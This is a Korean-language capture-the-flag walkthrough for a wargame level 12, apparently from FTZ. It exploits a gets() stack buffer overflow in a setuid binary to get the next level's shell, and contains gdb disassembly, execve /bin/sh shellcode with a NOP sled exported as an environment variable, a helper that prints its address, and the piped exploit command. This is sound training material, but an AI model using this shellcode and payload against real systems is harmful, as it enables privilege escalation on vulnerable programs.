@@ -1,0 +1,100 @@
+level 12 풀이
+
+cat hint 를 눌러 힌트를 확인한다.
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main( void )
+{
+        char str[256];
+
+        setreuid( 3093, 3093 );
+        printf( "문장을 입력하세요.\n" );
+        gets( str );
+        printf( "%s\n", str );
+}
+
+
+레벨 11은 strcmp 로 문자열을 복사해서 바로 main에서 실행하는 거였는데
+
+이번 문제는 gets함수를 통해 입력받고 버퍼오버플로우공격을 하는 방식이다.
+
+레벨 11에서 배운 환경변수법을 통해서 한번 레벨 13 쉘을 따내어보자.
+
+먼저 attackme 를 gdb -q 해서 살펴본다.
+
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Dump of assembler code for function main:
+0x08048470 <main+0>:    push   ebp
+0x08048471 <main+1>:    mov    ebp,esp
+0x08048473 <main+3>:    sub    esp,0x108
+0x08048479 <main+9>:    sub    esp,0x8
+0x0804847c <main+12>:   push   0xc15
+0x08048481 <main+17>:   push   0xc15
+0x08048486 <main+22>:   call   0x804835c <setreuid>
+0x0804848b <main+27>:   add    esp,0x10
+0x0804848e <main+30>:   sub    esp,0xc
+0x08048491 <main+33>:   push   0x8048538
+0x08048496 <main+38>:   call   0x804834c <printf>
+0x0804849b <main+43>:   add    esp,0x10
+0x0804849e <main+46>:   sub    esp,0xc
+0x080484a1 <main+49>:   lea    eax,[ebp-264]
+0x080484a7 <main+55>:   push   eax
+0x080484a8 <main+56>:   call   0x804831c <gets>
+0x080484ad <main+61>:   add    esp,0x10
+0x080484b0 <main+64>:   sub    esp,0x8
+0x080484b3 <main+67>:   lea    eax,[ebp-264]
+0x080484b9 <main+73>:   push   eax
+0x080484ba <main+74>:   push   0x804854c
+0x080484bf <main+79>:   call   0x804834c <printf>
+---Type <return> to continue, or q <return> to quit---
+0x080484c4 <main+84>:   add    esp,0x10
+0x080484c7 <main+87>:   leave
+0x080484c8 <main+88>:   ret
+0x080484c9 <main+89>:   lea    esi,[esi]
+0x080484cc <main+92>:   nop
+0x080484cd <main+93>:   nop
+0x080484ce <main+94>:   nop
+0x080484cf <main+95>:   nop
+
+읽어보면 264 부터 시작한다. 즉 264+8 = 272  	ret값 4를 제외하면 268 즉 레벨 11 메모리 구조와 똑같다.
+
+이제 환경변수를 등록하러 가보자
+
+환경변수 등록하는 방법은 
+
+export shellcode=$(python -c 'print "\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+
+이다, 즉  export 이름=$(python -c 'print "\x90"*50+"25바이트 쉘코드"') 해주면 등록이 된다.
+(\x90은 공백을 의미하므로 264개 이하 몇번을 넣어도 괜찮을거같다.)
+
+그리고 이제 주소를 구하기위한 소스코드를 작성해보자 레벨 11이랑 똑같다.
+
+vi shell.c 로 만들어주고
+
+int main()
+{
+	printf("%p\n", getenv("shellcode"));	# 내가만든 환경변수 이름을 넣어준다.
+	return 0;
+}
+
+를 적어주고 저장해주고 나서
+
+gcc -o shell shell.c 로 컴파일을 해주면
+
+파일이 하나나오는데 그것을 실행시키면 주소가 나온다.
+
+0xbffffedc  << 이렇게 나온다.
+
+그러면 바로 이제 버퍼오버플로우 공격을 하면되는데 이번에는 gets함수로 입력받는것이라 실행을 다르게 해주어야한다.
+
+(python -c 'print "\x90"*268+"\xdc\xfe\xff\xbf"';cat) | ./attackme 	형식으로 실행해 주면 된다.
+
+즉 >> (python -c 'print "\x90"*길이+"ret주소"';cat) | ./파일이름
+
+
+그러면 자동으로 레벨 13 쉘을 획득이 가능하다. 그리고 문자열 입력이 가능해지는데 거기다가 my-pass 를 치면 암호가 나온다.
+
